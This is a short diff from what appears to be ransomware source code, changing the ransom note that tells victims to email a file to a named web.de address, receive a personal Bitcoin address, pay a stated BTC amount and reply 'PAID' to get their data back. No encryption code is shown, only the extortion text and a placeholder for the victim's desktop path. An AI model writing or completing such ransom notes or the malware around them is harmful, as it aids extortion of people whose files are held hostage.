@@ -157,7 +157,7 @@ To purchase your key and restore your data, please follow these three easy steps
 
 1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to cem-celik2@web.de
 
-2. You will recieve your personal BTC address for payment.
+2. You will recieve your personal BTC address for payment (0,000042 BTC).
    Once payment has been completed, send another email to cem-celik2@web.de stating "PAID".
    We will check to see if payment has been paid.
 
